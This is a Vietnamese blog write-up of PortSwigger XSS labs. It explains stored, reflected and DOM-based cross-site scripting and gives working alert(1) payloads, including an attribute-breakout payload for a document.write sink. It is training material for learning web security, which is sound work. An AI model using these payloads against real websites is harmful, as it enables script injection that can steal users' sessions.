---
title: "[PortSwigger Lab] - Cross Site Script"
description: Solution of XSS on PortSwigger Lab
date: 2025-05-21 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, xss, cross site script]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-25-portswigger-cross-site-script/xss.png
    alt: Cross Site Script
---

## Introduction
---

### Cross-Site Scripting (XSS)
`Cross-Site Scripting (XSS)` là một lỗ hổng bảo mật phổ biến trong các ứng dụng web, cho phép kẻ tấn công chèn mã độc (thường là `JavaScript`) vào trang web được người dùng khác truy cập. Khi nạn nhân truy cập trang web bị chèn mã, đoạn mã độc sẽ được trình duyệt thực thi thay cho người dùng, từ đó kẻ tấn công có thể:
- Đánh cắp `cookie`, `session token`
- Thực hiện hành vi thay người dùng (ví dụ gửi yêu cầu giả danh người dùng)
- Hiển thị nội dung giả mạo
- Lừa người dùng nhập thông tin cá nhân

### Type of XSS
1. Stored XSS (XSS lưu trữ): 
- Mã độc được lưu vào cơ sở dữ liệu, bình luận, bài viết... và được hiển thị lại cho các người dùng khác.
- Ví dụ: người dùng chèn script vào phần bình luận → các người dùng khác vào xem sẽ bị dính mã độc.

2. Reflected XSS (XSS phản chiếu):
- Mã độc nằm trong URL hoặc input và được phản hồi ngay trong trang web.

3. DOM-based XSS:
- Mã độc được thực thi bởi chính `JavaScript` phía client do thao tác với DOM mà không kiểm tra kỹ input.

## Solve XSS Labs
---

### Lab: Reflected XSS into HTML context with nothing encoded
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa một lỗ hổng `XSS reflected` đơn giản trong chức năng tìm kiếm.

1. Lổ hổng `XSS reflected` xuất hiện ở chức năng `search`, kết quả khi `search`:
```html
0 search results for 'abc'
```

2. Thay thế `abc` bằng `payload`:
```
<img src=0 onerror=alert(1)>
```
- `<img src=0>`: cố gắng tải một ảnh từ đường dẫn "0" → sẽ bị lỗi (image không tồn tại).
- `onerror=alert(1)`: khi lỗi xảy ra (tức là không tải được ảnh), sự kiện `onerror` được kích hoạt và trình duyệt thực thi alert(1).

### Lab: Stored XSS into HTML context with nothing encoded
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa một lỗ hổng `XSS stored` đơn giản trong chức năng tìm kiếm.

1. Lổ hổng `XSS stored` xuất hiện ở chức năng `comment`, sau khi `comment`, `payload` được lưu trữ và hiển thị trên trình duyệt nạn nhân truy cập vào liên kết đó 
Payload:
```
<img src=0 onerror=alert(1)>
```

2. Thêm `payload` trên vào phần comment, điền đầy đủ thông tin và đăng
3. Trở lại bài `post` -> xuất hiện `alert`

### Lab: DOM XSS in **document.write** sink using source **location.search**
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa lỗ hổng XSS dựa trên DOM trong chức năng theo dõi truy vấn tìm kiếm. Nó sử dụng chức năng JavaScript `document.write`, ghi dữ liệu ra trang. Hàm `document.write` được gọi với dữ liệu từ `location.search`, mà bạn có thể kiểm soát bằng URL trang web.

1. Thực hiện `search`, kết quả:
```html
0 search results for 'abc'
```

2. **Inspect**, kiểm tra `<script>`
```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>                    
<img src="/resources/images/tracker.gif?searchTerms=abc" gafqlj9w1="">
```
- Đọc giá trị `search` từ `URL`
- Dùng `document.write(...)` để chèn ảnh vào trang với `query`  là từ khóa cần tìm

3. Thêm `payload` để tạo thêm thẻ `<img>`
```
"> <img src=0 onerror=alert(1)>
```

4. Kết quả:
```html
<img src="/resources/images/tracker.gif?searchTerms=" qm024hoew="">
<img src="0" onerror="alert(1)">
">
```

---
Goodluck! 🍀🍀🍀